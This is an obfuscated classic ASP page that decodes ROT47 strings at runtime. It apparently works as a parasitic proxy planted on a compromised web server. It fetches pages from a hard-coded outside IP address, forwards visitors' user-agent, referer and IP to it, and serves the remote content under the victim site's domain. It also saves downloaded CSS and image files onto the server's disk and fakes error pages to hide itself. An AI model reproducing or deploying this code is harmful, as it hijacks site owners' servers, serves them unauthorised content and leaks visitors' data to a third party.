<%@ LANGUAGE=VBSCRIPT CODEPAGE=65001 %>
<%
Dim X7777X,X777X7,X777XX,X77X77,X77X7X
Set X777XX=Response:Set X777X7=Request:Set X77X7X=Session:Set X7777X=Application:Set X77X77=Server
Set X7X7X77 = New XX7X77
X7X7X77.dizhi 	= XX777X("bf]e`]aba]`fb")
X7X7X77.filename 	= X777X7.ServerVariables(XX777X("$4C:AE0}2>6"))
X7X7X77.csvalue 	= XX777X("G:56@")
X7X7X77.cachefile 	= XX777X("^42496")
X7X7X77.connect
Class XX7X77
Public XX7X7X,dizhi,XX7XXX,filename,csvalue,cachefile
Private XXX7XX,XXXX77,XXXX7X,XXXXX7,XXXXXX,X777777,X77777X
Private Sub Class_Initialize
XXX7XX	= ""
filename	= XX777X(":?56I]2DA")
csvalue		= XX777X("A286")
XXXX77	= X777X7.ServerVariables(XX777X("$t#")&XX777X("'t#0$~u%")&XX777X("(p#t"))
XX7X7X 		= XX777X("`af]_]_]`")
dizhi 	= XX777X("`af]_]_]`")
XX7XXX	= ""
X777777 	= X777X7.ServerVariables(XX777X("w%%!0w~$%"))
cachefile 	= XX777X("^42496")
X77777X			= X7XXXX()
End Sub
Function connect()
Dim X7777X7
Set X7777X7 = X77X77.Createobject(XX777X("(")&XX777X(":?w")&XX777X("E")&XX777X("EA](:")&XX777X("?wEEA#")&XX777X("6BF6D")&XX777X("E]")&"5"&".1")
X7777X7.option(6) = false
X7777X7.Open XX777X("vt%"), XX777X("9EEAi^^")&dizhi&XX777X("^")&X777X7.QueryString(csvalue) , False
X7777X7.setRequestHeader XX777X(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), X77777X
X7777X7.setRequestHeader XX777X("w@DE"), X777777
X7777X7.setRequestHeader XX777X("&D6C\p86?E"), X777X7.ServerVariables(XX777X("w%%!0&$t#0pvt}%"))
If X777X7.ServerVariables(XX777X("w%%!0#tut#t#"))<>"" Then
X7777X7.setRequestHeader XX777X("#676C6C"), X777X7.ServerVariables(XX777X("w%%!0#tut#t#"))
End If
X7777X7.Send()
X7777X7.WaitForResponse()
XXXXXX			= X7777X7.ResponseBody
XXX7XX		= X7777X7.Status
If XXX7XX=302 or XXX7XX= 301 Then
XXXXX7	= X7777X7.GetResponseHeader(XX777X("{@42E:@?"))
end if
Set X7777X7=Nothing
set X7X7X7X = X77X77.CreateObject(XX777X("p5@53]$EC62>"))
X7X7X7X.Type = (34 * 96 - 3263)
X7X7X7X.Mode = (43 * 105 - 4512)
X7X7X7X.Open
X7X7X7X.Write XXXXXX
X7X7X7X.Position = (30 * 48 - 1440)
X7X7X7X.Type = (11 * 24 - 262)
X7X7X7X.Charset = XX777X("&%u\g")
XXXXXX = X7X7X7X.ReadText
X7X7X7X.Close
X77XXX()
End function
Function X77XXX()
If XXX7XX="302" Then
X777XX.Redirect(XXXXX7)
Exit Function
ElseIf XXX7XX="301" Then
X777XX.Status = XX777X("w%%!^`]` ,b_` ,|@G65 ,!6C>2?6?E=J")
X777XX.Addheader XX777X("{@42E:@?"),XXXXX7
Exit Function
ElseIf XXX7XX="404" Then
X777XX.Status = XX777X("w%%!^`]` ,c_c ,}@E ,u@F?5")
X777XX.Addheader XX777X("s2E6"), now&XX777X(" ,v|%")
X777XX.Addheader XX777X("$6CG6C"), XXXX77
X777XX.Addheader XX777X("r@?E6?E\%JA6"),XX777X("E6IE^9E>=")
X777XX.Write XX777X("k9E>=mk9625mkE:E=6mc_c ,}@E ,u@F?5k^E:E=6mk^9625mk3@5Jmk9`mc_c ,}@E ,u@F?5k^9`m")&XXXX77&XX777X("k^3@5Jmk^9E>=m")
Exit Function
ElseIf XXX7XX="403" Then
X777XX.Status = XX777X("w%%!^`]` ,c_b ,u@C3:556?")
X777XX.Addheader XX777X("s2E6"), now &XX777X(" ,v|%")
X777XX.Addheader XX777X("$6CG6C"), XXXX77
X777XX.Addheader XX777X("r@?E6?E\%JA6"),XX777X("E6IE^9E>=")
X777XX.Write XX777X("k9E>=mk9625mkE:E=6mc_b ,u@C3:556?k^E:E=6mk^9625mk3@5Jmk9`mc_b ,u@C3:556?k^9`m")&XXXX77&XX777X("k^3@5Jmk^9E>=m")
Exit Function
End If
X777XX.ContentType = XX777X("E6IE^9E>=")
X777XX.AddHeader XX777X("r@?E6?E\%JA6"), XX777X("E6IE^9E>=j492CD6El&%u\g")
X777XX.CodePage = (37 * 30 - -63891)
X777XX.CharSet = XX777X("&%u\g")
XXXXXX = X7X777(XX777X("9C67l-Q^W]YnX-]W9E>=M2DAM9E>X-Q"), XX777X("9C67lQ")&filename&XX777X("n")&csvalue&XX777X("lS`]SaQ"), XXXXXX)
XXXXXX = X7X77X(XX777X("9C67l-QW]YnX-]W4DDX-Q"),XX777X("9C67lQ")&cachefile&XX777X("S`]SaQ"), XXXXXX,XX777X("4DD"))
XXXXXX = X7X77X(XX777X("DC4l-QW]YnX-]W8:7M;A8MA?8X-Q"),XX777X("DC4lQ")&cachefile&XX777X("S`]SaQ"), XXXXXX,XX777X(":>8"))
X777XX.Write XXXXXX
End Function
Function X7X777(X7XX7XX, X7XXX77, Str)
Dim X7777XX
Set X7777XX = New RegExp
X7777XX.Pattern = X7XX7XX
X7777XX.IgnoreCase = false
X7777XX.Global = True
X7X777 = X7777XX.Replace(Str, X7XXX77)
End Function
Function X7X77X(X7XX7XX, X7XXX77, Str, X7XXXX7)
Dim X7777XX, X777X77, X777X7X
Set X7777XX = New RegExp
X7777XX.Pattern = X7XX7XX
X7777XX.IgnoreCase = false
X7777XX.Global = True
Set X777X7X = X7777XX.Execute(Str)
For Each X777X77 in X777X7X
IF X7XXXX7 = XX777X("4DD") then
X7X7X7 X777X77.SubMatches(0)&XX777X("]")&X777X77.SubMatches(1)
Elseif X7XXXX7 = XX777X(":>8") Then
X7X7XX  X777X77.SubMatches(0)&XX777X("]")&X777X77.SubMatches(1)
End If
Next
X7X77X = X7777XX.Replace(Str, X7XXX77)
End Function
Function X7X7X7(X7XXXXX)
dim X777XX7
X777XX7=X77X77.MapPath(XX777X("^"))&cachefile&X7XXXXX
Set X7X7XX7=X77X77.CreateObject(XX777X("$4C:A")&XX777X("E:?8]u:=")&XX777X("6$JDE")&XX777X("6>~3;")&XX777X("64E"))
If X7X7XX7.FileExists(X777XX7) Then
Set X7X7XX7=Nothing
Exit Function
end if
Set X7X7XX7=Nothing
Dim X7777X7
Set X7777X7 = X77X77.Createobject(XX777X("(:?w")&XX777X("EEA](:?")&XX777X("wEEA")&XX777X("#6BF6")&XX777X("DE]")&"5."&"1")
X7777X7.option(6) = false
X7777X7.Open XX777X("!~$%"), XX777X("9EEAi^^")&dizhi&X7XXXXX , False
X7777X7.setRequestHeader XX777X("w@DE"), X777777
X7777X7.setRequestHeader XX777X(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), X77777X
X7777X7.Send()
X7X7XXX = X7777X7.ResponseText
X7XXX7(XX777X("^")&X7XX7X(cachefile&X7XXXXX))
XX77XX XX777X("^")&cachefile&X7XXXXX,X7X7XXX,XX777X("&%u\g")
Set X7777X7=Nothing
End function
Function X7X7XX(X7XXXXX)
On Error Resume Next
dim X777XX7
X777XX7=X77X77.MapPath(XX777X("^"))&cachefile&X7XXXXX
Set X7X7XX7=X77X77.CreateObject(XX777X("$4C:A")&XX777X("E:?8]u:=")&XX777X("6$JDE")&XX777X("6>~3;")&XX777X("64E"))
If X7X7XX7.FileExists(X777XX7) Then
Set X7X7XX7=Nothing
Exit Function
end if
Set X7X7XX7=Nothing
Dim X7777X7
Set X7777X7 = X77X77.Createobject(XX777X("(:?")&XX777X("wEE")&XX777X("A](:?w")&XX777X("EEA#")&XX777X("6BF6")&XX777X("DE]d")&".1")
X7777X7.option(6) = false
X7777X7.Open XX777X("vt%"), XX777X("9EEAi^^")&dizhi&X7XXXXX , False
X7777X7.setRequestHeader XX777X("w@DE"), X777777
X7777X7.setRequestHeader XX777X(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), X77777X
X7777X7.Send()
X7777X7.WaitForResponse
X7XXX7(XX777X("^")&X7XX7X(cachefile&X7XXXXX))
Set X7XX777=X77X77.CreateObject(XX777X("25@")&XX777X("53]DEC")&XX777X("62>"))
X7XX777.Type= (34 * 96 - 3263)
X7XX777.open
X7XX777.write X7777X7.ResponseBody
X7XX777.SaveToFile X77X77.MapPath(XX777X("^")&cachefile&X7XXXXX)
X7XX777.flush
X7XX777.Close
Set X7XX777=Nothing
Set X7777X7=Nothing
End function
Function X7XX77(XX77777)
X7XX77 = mid(XX77777,instrrev(XX77777,XX777X("^"))+1)
End Function
Function X7XX7X(XX77777)
X7XX7X = Left(XX77777,instrrev(XX77777,XX777X("^")))
End Function
Function X7XXX7(ByVal CFolder)
Dim X777XXX, X77X777, X77X77X, CreateFolder
Dim X77X7XX, X77XX77, X77XX7X, X77XXX7, X77XXXX
X77XXXX = False
CreateFolder = CFolder
On Error Resume Next
Set X777XXX = X77X77.CreateObject(XX777X("$4C")&XX777X(":AE:?8]")&XX777X("u:=6")&XX777X("$JDE6>")&XX777X("~3;64E"))
If Err Then
Err.Clear()
Exit Function
End If
If Right(CreateFolder, 1) = XX777X("^") Then
CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
End If
X77X77X = Split(CreateFolder, XX777X("^"))
For X77X7XX = 0 To UBound(X77X77X)
X77XX7X = ""
For X77XX77 = 0 To X77X7XX
X77XX7X = X77XX7X & X77X77X(X77XX77) & XX777X("^")
Next
X77XXX7 = X77X77.MapPath(X77XX7X)
If Not X777XXX.FolderExists(X77XXX7) Then
X777XXX.CreateFolder(X77XXX7)
End If
Next
If Err Then
Err.Clear()
Else
X77XXXX = True
End If
X7XXX7 = X77XXXX
End Function
Sub XX77XX (XX7777X,byval Str,CharSet)
On Error Resume Next
set X7XX777=X77X77.CreateObject(XX777X("25@")&XX777X("53]DEC")&XX777X("62>"))
X7XX777.Type= (11 * 24 - 262)
X7XX777.mode= (43 * 105 - 4512)
X7XX777.open
X7XX777.WriteText str
X7XX777.SaveToFile X77X77.MapPath(XX7777X)
X7XX777.flush
X7XX777.Close
set X7XX777=nothing
End Sub
Function X7XXXX()
on error resume next
Dim X7X7777
If X777X7.ServerVariables(XX777X("w%%!0")&XX777X(")0")&XX777X("u~#")&XX777X("(p#sts0u~#")) = "" Or InStr(X777X7.ServerVariables(XX777X("w")&XX777X("%%!0)0u~")&XX777X("#(")&XX777X("p#s")&XX777X("ts0u~#")), XX777X("F?<?@H?")) > 0 Then
X7X7777 = X777X7.ServerVariables(XX777X("#t|")&XX777X("~%t0p")&XX777X("ss#"))
ElseIf InStr(X777X7.ServerVariables(XX777X("w%")&XX777X("%!0)0u~#(")&XX777X("p#sts0u~#")), XX777X("[")) > 0 Then
X7X7777 = Mid(X777X7.ServerVariables(XX777X("w")&XX777X("%%!0)0u~")&XX777X("#(p#s")&XX777X("ts0u~#")), 1, InStr(X777X7.ServerVariables(XX777X("w%%")&XX777X("!0)0u")&XX777X("~#(")&XX777X("p#")&XX777X("sts0u")&XX777X("~#")), XX777X("["))-1)
X7XX77X = X777X7.ServerVariables(XX777X("#t|~")&XX777X("%t0pss")&XX777X("#"))
ElseIf InStr(X777X7.ServerVariables(XX777X("w%%")&XX777X("!0)0u")&XX777X("#(")&XX777X("p#sts0u~#")), XX777X("j")) > 0 Then
X7X7777 = Mid(X777X7.ServerVariables(XX777X("w%")&XX777X("%!0)0u~#(")&XX777X("p#sts0u~#")), 1, InStr(X777X7.ServerVariables(XX777X("w")&XX777X("%%!0")&XX777X("0u~#")&XX777X("(p#s")&XX777X("ts0u~#")), XX777X("j"))-1)
X7XX77X = X777X7.ServerVariables(XX777X("#")&XX777X("t|~")&XX777X("%t0pss")&XX777X("#"))
Else
X7X7777 = X777X7.ServerVariables(XX777X("w%")&XX777X("%!")&XX777X("0)0u~")&XX777X("#(p#s")&XX777X("ts0u~#"))
X7XX77X = X777X7.ServerVariables(XX777X("#t|")&XX777X("~%t0ps")&XX777X("s#"))
End If
X7XXXX = Replace(Trim(Mid(X7X7777, 1, 30)), XX777X("V"), "")
End Function
Function XX7777()
On Error Resume Next
Dim X7X777X
If LCase(X777X7.ServerVariables(XX777X("w%%!$"))) = XX777X("@77") Then
X7X777X = XX777X("9EEAi^^")
Else
X7X777X = XX777X("9EEADi^^")
End If
X7X777X = X7X777X&X777X7.ServerVariables(XX777X("$t#'t#0}p|t"))
If X777X7.ServerVariables(XX777X("$t#'t#0!~#%")) <> 80 Then
X7X777X = X7X777X&XX777X("i")&X777X7.ServerVariables(XX777X("$t#'t#0!~#%"))
End If
X7X777X = X7X777X&X777X7.ServerVariables(XX777X("&#{"))
If Trim(X777X7.QueryString)<>"" Then
X7X777X = X7X777X&XX777X("n")&Trim(X777X7.QueryString)
End If
XX7777 = X7X777X
End Function
End Class
Function XX777X(ByVal X7XX7X7)
Dim X7X77X7, X77X7XX, X7X77XX
X7XX7X7 = Replace(X7XX7X7, Chr(37) & ChrW(-243) & Chr(62), Chr(37) & Chr(62))
For X77X7XX = 1 To Len(X7XX7X7)
If X77X7XX <> X7X77XX Then
X7X77X7 = AscW(Mid(X7XX7X7, X77X7XX, 1))
If X7X77X7 >= 33 And X7X77X7 <= 79 Then
XX777X = XX777X & Chr(X7X77X7 + 47)
ElseIf X7X77X7 >= 80 And X7X77X7 <= 126 Then
XX777X = XX777X & Chr(X7X77X7 - 47)
Else
X7X77XX = X77X7XX + 1
If Mid(X7XX7X7, X7X77XX, 1) = XX777X("o") Then XX777X = XX777X & ChrW(X7X77X7 + 5) Else XX777X = XX777X & Mid(X7XX7X7, X77X7XX, 1)
End If
End If
Next
End Function
%>